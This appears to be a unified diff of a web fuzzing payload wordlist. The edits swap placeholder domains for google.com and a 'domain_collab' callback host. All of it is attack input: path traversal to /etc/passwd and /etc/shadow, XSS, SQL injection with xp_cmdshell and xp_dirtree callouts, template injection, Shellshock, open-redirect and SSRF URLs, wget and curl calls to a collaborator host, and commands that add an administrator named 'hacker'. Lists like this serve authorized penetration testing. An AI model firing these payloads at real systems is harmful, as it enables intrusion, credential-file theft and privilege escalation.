+http:google.com@[::216.58.214.206]
+http://google.com:80%40google.com/
 http://XY>.7d8T\205pZM@00330.0x3a.54990
 http:XY>.7d8T\205pZM@0330.072.0326.0316
 http:XY>.7d8T\205pZM@[::216.58.214.206]
@@ -6393,10 +6393,10 @@ telnet://ssrf1.domain_collab$google.com
 ../../../../../var/log/httpd/access_log
 ../../../../../var/log/nginx/access.log
 ../../../../../var/log/nginx/access_log
-///whitelisted.com@google.com/%2e%2e%2f
-///whitelisted.com@google.com/%2f%2e%2e
-///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
-//www.whitelisteddomain.tld@google.com/
+///google.com@google.com/%2e%2e%2f
+///google.com@google.com/%2f%2e%2e
+///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+//www.google.com@google.com/
 ..%252f..%252f..%252fboot.ini;index.html
 ..%255c..%255c..%255cboot.ini;index.html
 %2e%2e/%2e%2e/%2e%2e/boot.ini;index.html
@@ -6406,7 +6406,7 @@ telnet://ssrf1.domain_collab$google.com
 /\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c
 %2e%2e%5c%2e%2e%5c/etc/passwd;index.html
 //3H6k7lIAiqjfNeN@google.com@google.com/
-/%5cwww.whitelisteddomain.tld@google.com
+/%5cwww.google.com@google.com
 .../.../.../.../.../.../.../.../boot.ini
 ...\...\...\...\...\...\...\...\boot.ini
 ..//..//..//..//..//..//..//..//boot.ini
@@ -6442,16 +6442,16 @@ C:/windows/panther/unattend/unattend.xml
 exec master..xp_cmdshell 'ipconfig+/all'
 'exec sp_addlogin 'name' , 'password' --
 http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
-http://google.com%2f%2f.whitelisted.com/
-http://google.com%5c%5c.whitelisted.com/
+http://google.com%2f%2f.google.com/
+http://google.com%5c%5c.google.com/
 https:///google.com@google.com/%2f%2e%2e
 /https://google.com@google.com/%2f%2e%2e
 /https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
-https://whitelisted.com@google.com/%2f..
-https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
-/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http:whitelisted.com@0xd8.0x3a.0xd6.0xce
-http://whitelisted.com%2eⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://google.com@google.com/%2f..
+https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+/https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http:google.com@0xd8.0x3a.0xd6.0xce
+http://google.com%2eⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <i onwheel=alert(1)> Scroll over me </i>
@@ -6470,12 +6470,12 @@ md5("ffifdyop", true) = 'or'6�]��!r,��b�
 ../../../../../var/log/apache/access.log
 ../../../../../var/log/apache/access_log
 @var select @var as var into temp end --
-////whitelisted.com@google.com/%2e%2e%2f
-////whitelisted.com@google.com/%2f%2e%2e
-///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
-///www.whitelisteddomain.tld@google.com/
-//www.whitelisteddomain.tld@google.com//
+////google.com@google.com/%2e%2e%2f
+////google.com@google.com/%2f%2e%2e
+///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+///www.google.com@google.com/
+//www.google.com@google.com//
 \xampp\FileZillaFTP\FileZilla Server.xml
 //XY>.7d8T\205pZM@google.com@google.com/
 /..../..../..../..../..../..../..../..../
@@ -6485,7 +6485,7 @@ md5("ffifdyop", true) = 'or'6�]��!r,��b�
 /./.././.././.././.././.././.././.././../
 /.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\
 0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟
-/%09/www.whitelisteddomain.tld@google.com
+/%09/www.google.com@google.com
 ..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd
 /..0x2f..0x2f..0x2f..0x2f..0x2fetc/passwd
 ..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd
@@ -6516,7 +6516,7 @@ md5("ffifdyop", true) = 'or'6�]��!r,��b�
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
 ..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
 ..%5c..%5c..%5c..%5cboot.ini%00index.html
-//%5cwww.whitelisteddomain.tld@google.com
+//%5cwww.google.com@google.com
 /.../.../.../.../.../.../.../.../boot.ini
 /...\...\...\...\...\...\...\...\boot.ini
 /..//..//..//..//..//..//..//..//boot.ini
@@ -6556,23 +6556,23 @@ C:/windows/system32/sysprepunattended.xml
 /etc/sysconfig/network-scripts/ifcfg-eth0
 exec master..xp_cmdshell 'ipconfig+/all'	
 {"".getClass().forName("java.util.Date")}
-//google.com+&@google.com#+@or.karmaz.pl/
+//google.com+&@google.com#+@or.domain_collab/
 http://3H6k7lIAiqjfNeN@0330.072.0326.0316
 http://3H6k7lIAiqjfNeN@[::216.58.214.206]
 http://google.com@[::ffff:216.58.214.206]
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%23.whitelisted.com/
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%3F.whitelisted.com/
-https://%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%23.google.com/
+http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%3F.google.com/
+https://%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 //https://google.com@google.com/%2e%2e%2f
 /https:///google.com@google.com/%2f%2e%2e
 https:///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
 /https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-https://:@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@whitelisted.com
-/https://whitelisted.com@google.com/%2f..
-http://whitelisted.com@0330.072.0326.0316
-http://whitelisted.com@[::216.58.214.206]
-http:www.whitelisteddomain.tld@0xd83ad6ce
-http:www.whitelisteddomain.tld@3627734734
+https://:@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@google.com
+/https://google.com@google.com/%2f..
+http://google.com@0330.072.0326.0316
+http://google.com@[::216.58.214.206]
+http:www.google.com@0xd83ad6ce
+http:www.google.com@3627734734
 http://XY>.7d8T\205pZM@0330.072.0326.0316
 http://XY>.7d8T\205pZM@[::216.58.214.206]
 ?id=1 and substring(version(),1,1)in(4,3)
@@ -6592,12 +6592,12 @@ net localgroup Administrators hacker /ADD
 /usr/local/apps/apache/conf/httpd.conf%00
 /usr/local/etc/apache2/conf/httpd.conf%00
 /usr/local/pureftpd/etc/pure-ftpd.conf%00
-////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-////www.whitelisteddomain.tld@google.com/
-///www.whitelisteddomain.tld@google.com//
+////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+////www.google.com@google.com/
+///www.google.com@google.com//
 //XY>.7d8T\205pZM@google.com+@google.com/
 ../../../../../../../../../../../../../../
-//%09/www.whitelisteddomain.tld@google.com
+//%09/www.google.com@google.com
 /%252e%252e/%252e%252e/%252e%252e/boot.ini
 /%252e%252e\%252e%252e\%252e%252e\boot.ini
 ..%252f..%252f..%252fboot.ini%00index.html
@@ -6610,7 +6610,7 @@ net localgroup Administrators hacker /ADD
 ..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
 ..%2f..%2f..%2f..%2f/etc/passwd;index.html
 ..%5c..%5c..%5c..%5c/etc/passwd;index.html
-///%5cwww.whitelisteddomain.tld@google.com
+///%5cwww.google.com@google.com
 " autofocus onkeyup="javascript:alert(123)
 ' autofocus onkeyup='javascript:alert(123)
 /../../../../../../../../../../../boot.ini
@@ -6629,30 +6629,30 @@ C:\xampp\FileZillaFTP\FileZilla Server.xml
 ../../../../../../etc/passwd&=%3C%3C%3C%3C
 /google.com/%2F..%0D%0AHeader-Test:BLATRUC
 http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@whitelisted.com/
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@whitelisted.com/
-https://%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-/https://%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@google.com/
+http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@google.com/
+https://%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/https://%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 https://google.com/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-https:///whitelisted.com@google.com/%2e%2e
-/https://whitelisted.com@google.com/%2e%2e
-//https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
-http://whitelisted.com@0xd8.0x3a.0xd6.0xce
-http://www.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.whitelisted.com
+https:///google.com@google.com/%2e%2e
+/https://google.com@google.com/%2e%2e
+//https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+http://google.com@0xd8.0x3a.0xd6.0xce
+http://www.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.google.com
 http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
 jaVAscript://google.com//%0d%0aalert(1);//
 {{request|attr(["__","class","__"]|join)}}
  select * from information_schema.tables--
 /usr/local/apps/apache2/conf/httpd.conf%00
 /usr/local/pureftpd/sbin/pure-config.pl%00
-//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
-//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-////www.whitelisteddomain.tld@google.com//
+//google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+//google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+////www.google.com@google.com//
 /.//..//.//..//.//..//.//..//.//..//.//..//
 /./\/././\/././\/././\/././\/././\/././\/./
 /.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\
 /.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\
-///%09/www.whitelisteddomain.tld@google.com
+///%09/www.google.com@google.com
 /..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f
 /..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c
 %252e%252e/%252e%252e/boot.ini%00index.html
@@ -6677,7 +6677,7 @@ jaVAscript://google.com//%0d%0aalert(1);//
 /%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66
 /%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini
-////%5cwww.whitelisteddomain.tld@google.com
+////%5cwww.google.com@google.com
 ..../..../..../..../..../..../..../boot.ini
 ....\....\....\....\....\....\....\boot.ini
 ..///..///..///..///..///..///..///boot.ini
@@ -6722,16 +6722,16 @@ C:/windows/system32/config/regback/software
 /../../../../../../../../../../etc/shadow^^
 ..\..\..\..\..\..\..\..\..\..\etc\shadow%00
 //google.com@https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-http://google.com&www.whitelisteddomain.tld
-http://google.com\www.whitelisteddomain.tld
+http://google.com&www.google.com
+http://google.com\www.google.com
 https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
 https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-https://whitelisted.com/https://google.com/
-http://whitelisted.com:80%40Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http:www.whitelisteddomain.tld@0xd8.3856078
-http://www.whitelisteddomain.tld@0xd83ad6ce
-http://www.whitelisteddomain.tld@3627734734
-http://www.whitelisteddomain.tld.google.com
+https://google.com/https://google.com/
+http://google.com:80%40Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http:www.google.com@0xd8.3856078
+http://www.google.com@0xd83ad6ce
+http://www.google.com@3627734734
+http://www.google.com.google.com
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 & net localgroup Administrators hacker /ADD
 ; net localgroup Administrators hacker /ADD
@@ -6758,11 +6758,11 @@ sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
 ../../../../../../../var/www/logs/error.log
 ../../../../../../../var/www/logs/error_log
 /var/www/vhosts/sitename/httpdocs/.htaccess
-///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
-///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 x' AND 1=(SELECT COUNT(*) FROM tabname); --
 <?xml version="1.0" encoding="ISO-8859-1"?>
-////%09/www.whitelisteddomain.tld@google.com
+////%09/www.google.com@google.com
 () { 0; }; touch /tmp/blns.shellshock1.fail;
 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
@@ -6821,16 +6821,16 @@ crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC
 exec master..xp_cmdshell 'ping+<attackerip>'
 http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
 http:google.com@00330.00072.0000326.00000316
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.whitelisted.com/
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.whitelisted.com/
+http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.google.com/
+http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.google.com/
 https:///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 /https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-https://whitelisted.com@google.com/%2e%2e%2f
-https://whitelisted.com@google.com/%2f%2e%2e
-https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
-https://www.whitelisteddomain.tld@google.com
-http:whitelisted.com@[::ffff:216.58.214.206]
-http:www.whitelisteddomain.tld@00330.3856078
+https://google.com@google.com/%2e%2e%2f
+https://google.com@google.com/%2f%2e%2e
+https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+https://www.google.com@google.com
+http:google.com@[::ffff:216.58.214.206]
+http:www.google.com@00330.3856078
 http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
 <img src=x\x09onerror="javascript:alert(1)">
 <img src=x\x10onerror="javascript:alert(1)">
@@ -6842,7 +6842,7 @@ http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
 <img\x13src=x onerror="javascript:alert(1)">
 <img\x32src=x onerror="javascript:alert(1)">
 <img\x47src=x onerror="javascript:alert(1)">
-javascript://whitelisted.com?%a0alert%281%29
+javascript://google.com?%a0alert%281%29
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 && net localgroup Administrators hacker /ADD
@@ -6871,10 +6871,10 @@ Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 ../../../../../../../var/www/logs/access_log
 & wget http://domain_collab/.testing/rce.txt
 | wget http://domain_collab/.testing/rce.txt
-//whitelisted.com@https:///google.com/%2e%2e
-////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
-////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-//www.whitelisteddomain.tld@google.com/%2f..
+//google.com@https:///google.com/%2e%2e
+////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+//www.google.com@google.com/%2f..
 '`"><\x00script>javascript:alert(1)</script>
 '`"><\x3Cscript>javascript:alert(1)</script>
 //XY>.7d8T\205pZM@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
@@ -6901,7 +6901,7 @@ Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 /..%%32%66..%%32%66..%%32%66..%%32%66boot.ini
 /..%%35%63..%%35%63..%%35%63..%%35%63boot.ini
 //3H6k7lIAiqjfNeN@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-//3H6k7lIAiqjfNeN@whitelisted.com@google.com/
+//3H6k7lIAiqjfNeN@google.com@google.com/
 /..\../..\../..\../..\../..\../..\../boot.ini
 /./\/././\/././\/././\/././\/././\/./boot.ini
 /.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini
@@ -6924,16 +6924,16 @@ C:\Program Files\xampp\apache\conf\httpd.conf
 exec master..xp_cmdshell 'ping+domain_collab'
 ; execute immediate 'sel' || 'ect us' || 'er'
 {% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
-//google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.karmaz.pl/
+//google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.domain_collab/
 http://3H6k7lIAiqjfNeN@google.com@google.com/
 //https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
 /https:///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-https:///whitelisted.com@google.com/%2f%2e%2e
-/https://whitelisted.com@google.com/%2f%2e%2e
-/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
-https://www.whitelisteddomain.tld@google.com/
-http:www.whitelisteddomain.tld@0xd8.072.54990
-http://www.whitelisteddomain.tld@0xd8.3856078
+https:///google.com@google.com/%2f%2e%2e
+/https://google.com@google.com/%2f%2e%2e
+/https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+https://www.google.com@google.com/
+http:www.google.com@0xd8.072.54990
+http://www.google.com@0xd8.3856078
 http://XY>.7d8T\205pZM@google.com@google.com/
 ?id=1 and substring(version(),1,1)not in(4,3)
 <img src\x00=x onerror="javascript:alert(1)">
@@ -6963,9 +6963,9 @@ SELECT ... INTO OUTFILE '\\\\domain_collab\a'
 ../../../../../../../var/log/apache/error_log
 ../../../../../../../var/log/nginx/access.log
 ../../../../../../../var/log/nginx/access_log
-///www.whitelisteddomain.tld@google.com/%2f..
+///www.google.com@google.com/%2f..
 //XY>.7d8T\205pZM@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-//XY>.7d8T\205pZM@whitelisted.com@google.com/
+//XY>.7d8T\205pZM@google.com@google.com/
 ' } ], $comment:'successful MongoDB injection'
 ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 \0://srff2.domain_collab;http://google.com:80/
@@ -6995,7 +6995,7 @@ ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 /%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/
 /..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66
 /..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63
-//3H6k7lIAiqjfNeN@whitelisted.com+@google.com/
+//3H6k7lIAiqjfNeN@google.com+@google.com/
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
 ..%5c..%5c..%5c..%5c..%5cboot.ini%00index.html
 ..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
@@ -7023,16 +7023,16 @@ echo '<script>alert(1)</script>'// XXXXXXXXXXX
 http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
 http://3H6k7lIAiqjfNeN@google.com+@google.com/
 http://google.com@00330.00072.0000326.00000316
-http://google.com+&@google.com#+@or.karmaz.pl/
-//https://whitelisted.com@google.com/%2e%2e%2f
-/https:///whitelisted.com@google.com/%2f%2e%2e
-https:///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-https://www.whitelisteddomain.tld@google.com//
-/https://www.whitelisteddomain.tld@google.com/
-http://whitelisted.com@[::ffff:216.58.214.206]
-http://www.whitelisteddomain.tld@00330.3856078
-http:www.whitelisteddomain.tld@472.314.470.462
+http://google.com+&@google.com#+@or.domain_collab/
+//https://google.com@google.com/%2e%2e%2f
+/https:///google.com@google.com/%2f%2e%2e
+https:///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+/https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+https://www.google.com@google.com//
+/https://www.google.com@google.com/
+http://google.com@[::ffff:216.58.214.206]
+http://www.google.com@00330.3856078
+http:www.google.com@472.314.470.462
 http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
 http://XY>.7d8T\205pZM@google.com+@google.com/
 <img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
@@ -7046,9 +7046,9 @@ javascript://https://google.com/?z=%0Aalert(1)
 ../../../../../../../var/log/apache/access.log
 ../../../../../../../var/log/apache/access_log
 /Volumes/webBackup/opt/apache2/conf/httpd.conf
-////www.whitelisteddomain.tld@google.com/%2f..
+////www.google.com@google.com/%2f..
 /x:1/:///%01javascript:alert(document.cookie)/
-//XY>.7d8T\205pZM@whitelisted.com+@google.com/
+//XY>.7d8T\205pZM@google.com+@google.com/
 //0://srff2.domain_collab;http://google.com:80/
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc/passwd
 /0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\etc/passwd
@@ -7106,12 +7106,12 @@ exec%20master..xp_dirtree%20'//domain_collab/a'
 " exec master..xp_dirtree '//domain_coolab/a'--
 ' exec master..xp_dirtree '//domain_coolab/a'--
 ` exec master..xp_dirtree '//domain_coolab/a'--
-https://%5cwww.whitelisteddomain.tld@google.com
-https://:@google.com\@www.whitelisteddomain.tld
-https://whitelisted.com/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http:www.whitelisteddomain.tld@00330.0x3a.54990
-http://www.whitelisteddomain.tld@0xd8.072.54990
-jaVAscript://whitelisted.com//%0d%0aalert(1);//
+https://%5cwww.google.com@google.com
+https://:@google.com\@www.google.com
+https://google.com/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http:www.google.com@00330.0x3a.54990
+http://www.google.com@0xd8.072.54990
+jaVAscript://google.com//%0d%0aalert(1);//
 %uff0e%uff0e%u2215%uff0e%uff0e%u2215/etc/passwd
 /%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd
 %uff0e%uff0e%u2216%uff0e%uff0e%u2216/etc/passwd
@@ -7165,14 +7165,14 @@ curl https://domain_collab/.testing/rce_vuln.txt
 `) exec master..xp_dirtree '//domain_coolab/a'--
 `; exec master..xp_dirtree '//domain_coolab/a'--
 `||exec master..xp_dirtree '//domain_coolab/a'--
-http://google.com:80#@www.whitelisteddomain.tld/
-http://google.com:80?@www.whitelisteddomain.tld/
-https://%09/www.whitelisteddomain.tld@google.com
-/https://%5cwww.whitelisteddomain.tld@google.com
-https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
-https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-//https://www.whitelisteddomain.tld@google.com//
-http://www.whitelisteddomain.tld@472.314.470.462
+http://google.com:80#@www.google.com/
+http://google.com:80?@www.google.com/
+https://%09/www.google.com@google.com
+/https://%5cwww.google.com@google.com
+https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+//https://www.google.com@google.com//
+http://www.google.com@472.314.470.462
 <iframe src=http://ha.ckers.org/scriptlet.html <
 <!--[if]><script>javascript:alert(1)</script -->
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
@@ -7192,7 +7192,7 @@ The quick brown fox... [Beeeep]
 /Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf
 /Volumes/Macintosh_HD1/usr/local/php/lib/php.ini
 wget https://domain_collab/.testing/rce_vuln.txt
-//whitelisted.com@https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+//google.com@https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
 /./\/././\/././\/././\/././\/././\/././\/././\/./
 /.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f
@@ -7215,7 +7215,7 @@ wget https://domain_collab/.testing/rce_vuln.txt
 /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini
 ..%2f..%2f..%2f..%2f..%2f..%2fboot.ini;index.html
